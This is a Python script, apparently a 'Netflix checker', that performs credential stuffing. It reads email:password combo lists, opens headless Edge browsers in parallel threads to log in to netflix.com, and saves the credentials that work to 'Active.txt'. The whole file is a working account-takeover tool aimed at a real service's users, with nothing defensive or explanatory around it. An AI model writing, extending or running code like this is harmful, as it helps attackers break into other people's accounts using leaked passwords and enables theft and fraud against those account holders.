import sys
import time
import requests
from selenium import webdriver
from selenium.webdriver.edge.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from concurrent.futures import ThreadPoolExecutor, as_completed

# EdgeDriver Path
EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe" #dg dẫn đến msedgerdriver

def print_banner():
    banner = """
____   _________.___.____  __.  _____    _______  ___________.____    ._______  ___
\   \ /   /\__  |   |    |/ _| /  _  \   \      \ \_   _____/|    |   |   \   \/  /
 \   Y   /  /   |   |      <  /  /_\  \  /   |   \ |    __)  |    |   |   |\     / 
  \     /   \____   |    |  \/    |    \/    |    \|     \   |    |___|   |/     \ 
   \___/    / ______|____|__ \____|__  /\____|__  /\___  /   |_______ \___/___/\  \
            \/              \/       \/         \/     \/            \/         \_/
"""
    print(banner)

# Menu
def ask_user():
    while True:
        choice = input("Do you want to run now? (yes/no): ").strip().lower()
        if choice == "yes":
            print("Running...\n")
            time.sleep(1)
            return True
        elif choice == "no":
            print("Exiting. Goodbye!")
            sys.exit()
        else:
            print("Invalid selection. Please enter 'yes' or 'no'.")

# Input file cleaning function
def clean_file(input_file, output_file):
    cleaned_accounts = []
    with open(input_file, "r") as infile:
        for line in infile:
            line = line.strip()
            if ":" in line and len(line.split(":")) == 2:
                email, password = line.split(":")
                if email and password:
                    cleaned_accounts.append(f"{email}:{password}")
    with open(output_file, "w") as outfile:
        for account in cleaned_accounts:
            outfile.write(account + "\n")
    print(f"File cleaned. Valid account number: {len(cleaned_accounts)}")

# Check network connect dc chưa
def check_network():
    try:
        requests.get("https://www.netflix.com", timeout=5)
        return True
    except requests.ConnectionError:
        print("[!] Network error. Retrying...")
        time.sleep(5)
        return False

# function
def check_account(account):
    email, password = account.strip().split(":")
    options = webdriver.EdgeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")

    service = Service(EDGEDRIVER_PATH)
    driver = None
    try:
        driver = webdriver.Edge(service=service, options=options)
        driver.get("https://www.netflix.com/login")

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "userLoginId")))
        driver.find_element(By.NAME, "userLoginId").send_keys(email)
        driver.find_element(By.NAME, "password").send_keys(password + Keys.RETURN)
        time.sleep(3)

        if "browse" in driver.current_url:
            print(f"[+] Valid account: {email}")
            return "valid"
        else:
            print(f"[-] Invalid account: {email}")
            return "invalid"
    except TimeoutException:
        print(f"[!] Timeout: {email}")
        return "invalid"
    except WebDriverException as e:
        print(f"[!] Browser error {email}: {str(e)}")
        return "invalid"
    finally:
        if driver:
            try:
                driver.quit()
            except Exception as e:
                print(f"[!] Error closing browser for {email}: {str(e)}")

# đa luồn
def process_accounts(input_file, output_file, max_threads=10):
    valid_count = 0
    invalid_count = 0
    results = []

    with open(input_file, "r") as file:
        accounts = [line.strip() for line in file if line.strip()]

    with ThreadPoolExecutor(max_threads) as executor:
        futures = {executor.submit(check_account, account): account for account in accounts}
        for future in as_completed(futures):
            try:
                result = future.result(timeout=60)  # timeout
                if result == "valid":
                    valid_count += 1
                    results.append(futures[future])
                else:
                    invalid_count += 1
            except Exception as e:
                print(f"[!] Thread error: {str(e)}")
                invalid_count += 1

    # write to file: valid
    with open(output_file, "w") as f:
        for account in results:
            f.write(account + "\n")

    print(f"\nTotal valid accounts: {valid_count}")
    print(f"Total invalid accounts: {invalid_count}")
    print("The tool has completed all the work. The program will end now.")

def main():
    print_banner()
    if ask_user():
        raw_input_file = "combo.txt"
        cleaned_file = "cleaned_combo.txt"
        output_file = "Active.txt"
        max_threads = 10  # số luồn

        # xóa acc k đúng 
        clean_file(raw_input_file, cleaned_file)

        if check_network():

            process_accounts(cleaned_file, output_file, max_threads)

if __name__ == "__main__":
    main()
